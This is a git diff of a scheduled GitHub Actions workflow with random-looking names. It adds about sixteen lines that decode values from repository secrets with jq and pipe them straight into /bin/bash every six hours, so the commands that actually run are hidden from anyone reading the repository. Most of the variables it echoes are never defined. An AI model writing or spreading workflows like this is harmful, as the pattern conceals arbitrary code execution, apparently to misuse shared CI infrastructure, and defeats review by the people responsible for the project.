@@ -3,21 +3,31 @@ name: cordagetwice
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 5/6 * * *'
+    - cron: '1 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: cordagetwice
         env:
-          vfdsq88: ${{ secrets.vfdsq88 }}
+          eo13: ${{ secrets.eo13 }}
         run: |
-          echo $vfdsq88 | jq -r .gyoeo8 | /bin/bash
-          echo $bbn382 | jq -r .kvyu1717 | /bin/bash
-          echo $xj59 | jq -r .hxfrs5 | /bin/bash
-          echo $rbk62217 | jq -r .jvs5137 | /bin/bash
-          echo $ni5 | jq -r .p873 | /bin/bash
-          echo $tgp227 | jq -r .qyad06 | /bin/bash
-          echo $p2 | jq -r .a813 | /bin/bash
+          echo $eo13 | jq -r .yc71 | /bin/bash
+          echo $xd47430 | jq -r .mwgxq5908 | /bin/bash
+          echo $o43 | jq -r .txd7750 | /bin/bash
+          echo $jbhg74 | jq -r .pfr9686 | /bin/bash
+          echo $bacax46 | jq -r .yhoj80 | /bin/bash
+          echo $f4060 | jq -r .kg2 | /bin/bash
+          echo $xf54675 | jq -r .hgvx847 | /bin/bash
+          echo $wtz8 | jq -r .gdgto0564 | /bin/bash
+          echo $ib233 | jq -r .yl121 | /bin/bash
+          echo $ju2 | jq -r .sx44 | /bin/bash
+          echo $csr9627 | jq -r .n5 | /bin/bash
+          echo $ss2 | jq -r .ds2 | /bin/bash
+          echo $btpe4189 | jq -r .swpeg32684 | /bin/bash
+          echo $cde774 | jq -r .k13771 | /bin/bash
+          echo $yrij6 | jq -r .blg746 | /bin/bash
+          echo $xpbo10279 | jq -r .d56 | /bin/bash
 
